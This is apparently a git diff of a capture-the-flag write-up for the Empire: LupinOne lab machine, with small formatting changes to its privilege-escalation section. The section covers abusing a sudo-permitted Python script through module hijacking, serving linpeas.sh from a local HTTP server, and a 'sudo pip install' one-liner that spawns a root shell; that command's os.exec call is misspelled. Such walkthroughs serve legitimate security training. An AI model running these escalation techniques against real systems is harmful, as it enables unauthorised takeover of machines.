@@ -113,7 +113,7 @@ Enter passphrase: **P@55w0rd!**
 ## 6. Privilege Escalation.
 ### **Analyzing Sudo Privileges**
 From the previous output, we can see:
-> (arsene) NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py
+(arsene) NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py
 This means we can run a Python script as user `arsene` without a password.
 
 ### **Examining the Script**
@@ -123,10 +123,9 @@ This means we can run a Python script as user `arsene` without a password.
 <p align="center"> <img src="https://github.com/itstallam/Empire-LupinOne/blob/main/Screenshots/s10.png" width="600"/> </p>
 
 ### **Python Module Hijacking**
-
 The script imports the `webbrowser` module. We can exploit this by creating a malicious `webbrowser.py` file.
 First, let's check for writable files:
-This is possible by transferring linpeas.sh by creating a python http server over the port 8080
+This is possible by transferring linpeas.sh by creating a python http server over the port 8080.
 Navigate to the directory where the linpeas.sh file is on your local files and open a http server
 > python3 -m http.server 8080 //since port 80 is in use by the lupin vm.
 ---
@@ -170,7 +169,9 @@ From user arsene, we can exploit pip installation:
 
 ### **Commands Used**
 > arsene@LupinoOne:/$ TF=$(mktemp -d)
+
 > arsene@LupinoOne:/$ echo "import os; os.excl('/bin/sh', 'sh', '-c', 'sh <(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
+
 > arsene@LupinoOne:/$ sudo pip install $TF
 ---
 
